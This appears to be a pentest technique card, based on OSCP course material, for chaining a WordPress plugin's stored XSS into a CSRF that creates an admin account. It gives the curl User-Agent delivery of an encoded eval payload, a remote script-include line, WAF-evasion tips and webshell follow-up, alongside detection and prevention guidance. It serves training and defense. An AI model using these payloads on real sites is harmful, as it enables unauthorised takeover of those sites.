name: WordPress XSS → CSRF Admin Creation
description: Exploit a stored XSS vulnerability in a WordPress plugin that reflects unsanitized input (e.g. HTTP_USER_AGENT) to execute a two-stage CSRF attack: (1) extract the wp-admin nonce via XHR, (2) POST a new administrator account using that nonce. Delivered via curl --user-agent with a charCode-encoded eval() payload.
source: OSCP: Introduction to Web Application Attacks

steps.label: 1. Identify vulnerable plugin (echoes HTTP_USER_AGENT unescaped)
steps.command:
# Plugin logs UA to DB and echoes it in admin panel without sanitization
# PHP pattern: $_SERVER['HTTP_USER_AGENT']  echoed via echo $record->useragent

steps.label: 2. Write the CSRF payload JS (script.js) — stage 1: extract nonce
3. Write the CSRF payload JS (script.js) — stage 2: POST new admin user
4. Minify and encode full script.js to charCodes
5. Host script.js and deliver XSS via curl User-Agent
steps.command:
# Host: sudo php -S 0.0.0.0:80 /tmp/tmpserver
# Deliver stored XSS (UA is logged and echoed unsanitized):
curl -i http://<wp-target> \
  --user-agent "<script>eval(String.fromCharCode(<char_codes>))</script>"
# When a WP admin views the plugin logs page, the XSS fires in their session,
# the CSRF creates attacker:attackerpass as administrator.

steps.label: 6. Log in as new admin
steps.command:
# Navigate to http://<wp-target>/wp-login.php
# Username: attacker  Password: attackerpass

notes: The XSS fires in the victim admin's browser session, so same-origin XHR can read wp-admin pages and submit authenticated forms. The nonce (WordPress anti-CSRF token) must be extracted from the DOM first — the regex /ser" value="([^"]*?)"/g matches the _wpnonce_create-user hidden input. Minify both stages into one JS block before encoding. Deliver with curl --user-agent so the plugin logs it. The admin must view the stats/log page to trigger execution. Also covered in: OSCP PEN-200 Chapter 8 (Introduction to Web Application Attacks).

references.title: OffSec PEN-200 - Introduction to Web Application Attacks

recommended.note: Delivery mechanism: curl --user-agent to store XSS, <script src=> to load script.js.
Once you have WP admin, upload a PHP shell via theme/plugin editor.
Install a malicious plugin or edit theme to execute PHP.

defense.why_it_works: WordPress generates per-session nonces to prevent CSRF, but a stored XSS in a plugin that echoes raw HTTP_USER_AGENT allows attacker-controlled JavaScript to run in a logged-in admin's browser session. Same-origin policy permits the injected script to read wp-admin pages and their nonces, then POST authenticated requests — bypassing the CSRF protection entirely because the request originates from the victim's own session.
defense.prerequisites: A WordPress plugin that stores and echoes $_SERVER['HTTP_USER_AGENT'] without sanitization. A logged-in WP administrator who visits the plugin's admin page after the malicious UA is logged. Network access to deliver the curl request.
defense.impact: Full WordPress administrator account created under attacker control. From WP admin, an attacker can install plugins (PHP webshell), edit themes (PHP execution), or exfiltrate all site data.
defense.detection: New user creation events in WordPress audit logs (wp_users table). Unusual User-Agent strings containing <script> tags in access logs. Outbound HTTP request from the web server to an external IP (script.js hosted by attacker). WAF alerts on User-Agent containing HTML/JS.
defense.artifacts: Malicious UA string in web server access logs; new admin account in wp_users; outbound connection to attacker PHP server in network logs.
defense.prevention: Sanitize all user-controlled server variables before echoing (esc_html(), htmlspecialchars()). Implement a strict Content Security Policy (CSP: script-src 'self') to block inline eval() and external script loads. Enable WordPress nonces correctly — they already protect against CSRF but are bypassed when XSS is present. Use a WAF rule to block <script> in User-Agent headers.
defense.evasion: Encode the XSS payload to charCodes via String.fromCharCode to bypass simple string-match WAF rules. Minify the JS to a single line before encoding. Use a legitimate-looking external host for script.js.
defense.misconfiguration: WordPress plugin echoes $_SERVER['HTTP_USER_AGENT'] without escaping via esc_html() or htmlspecialchars(), allowing HTML/JS injection into the admin panel. No CSP header prevents eval() or external script loads.
defense.secure_config:
# Escape on output:
echo esc_html($record->useragent);  // WordPress escaping function
# Or: echo htmlspecialchars($record->useragent, ENT_QUOTES, 'UTF-8');

# Add CSP header in wp-config.php or .htaccess:
# Content-Security-Policy: script-src 'self'; object-src 'none'
defense.code_review:
RED FLAGS (source): user input written into HTML/JS without contextual encoding.
  echo $_GET / <?= $_REQUEST ?>  |  el.innerHTML = userVal  |  document.write(  |  React dangerouslySetInnerHTML  |  Angular [innerHTML]  |  {{{ raw }}} (unescaped Handlebars)
GREP:  grep -rniE "innerHTML|outerHTML|document\.write|insertAdjacentHTML|dangerouslySetInnerHTML|echo +\$_|<\?=" .
SAFE:  contextual output encoding (htmlspecialchars/textContent), auto-escaping templates, a strict CSP, and HttpOnly cookies.

examples.label: Deliver the payload via stored XSS
examples.command: <script src="http://<attacker>/wp-adduser.js"></script>   # inject into a field an admin will view

examples.label: Effect
examples.command: # forces the logged-in admin's browser to POST /wp-admin/user-new.php -> creates a new administrator account
